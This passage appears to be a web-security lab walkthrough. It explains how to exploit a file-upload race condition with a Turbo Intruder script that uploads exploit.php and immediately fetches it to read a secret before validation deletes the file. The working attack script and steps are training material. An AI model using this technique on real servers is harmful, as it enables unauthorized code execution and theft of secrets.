The Turbo Intruder window opens.\n\nCopy and paste the following script template into Turbo Intruder's Python editor:\n\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)\n\n    request1 = '''<YOUR-POST-REQUEST>'''\n\n    request2 = '''<YOUR-GET-REQUEST>'''\n\n    # the 'gate' argument blocks the final byte of each request until openGate is invoked\n    engine.queue(request1, gate='race1')\n    for x in range(5):\n        engine.queue(request2, gate='race1')\n\n    # wait until every 'race1' tagged request is ready\n    # then send the final byte of each request\n    # (this method is non-blocking, just like queue)\n    engine.openGate('race1')\n\n    engine.complete(timeout=60)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n\nIn the script, replace <YOUR-POST-REQUEST> with the entire POST /my-account/avatar request containing your exploit.php file. You can copy and paste this from the top of the Turbo Intruder window.\n\nReplace <YOUR-GET-REQUEST> with a GET request for fetching your uploaded PHP file. The simplest way to do this is to copy the GET /files/avatars/<YOUR-IMAGE> request from your proxy history, then change the filename in the path to exploit.php.\n\nAt the bottom of the Turbo Intruder window, click Attack. This script will submit a single POST request to upload your exploit.php file, instantly followed by 5 GET requests to /files/avatars/exploit.php.\n\nIn the results list, notice that some of the GET requests received a 200 response containing Carlos's secret. These requests hit the server after the PHP file was uploaded, but before it failed validation and was deleted.\n\nSubmit the secret to solve the lab.\n\nNote: If you choose to build the GET request manually, make sure you terminate it properly with a \\r\\n\\r\\n sequence. Also remember that Python will preserve any whitespace within a multiline string, so you need to adjust your indentation accordingly to ensure that a valid request is sent."
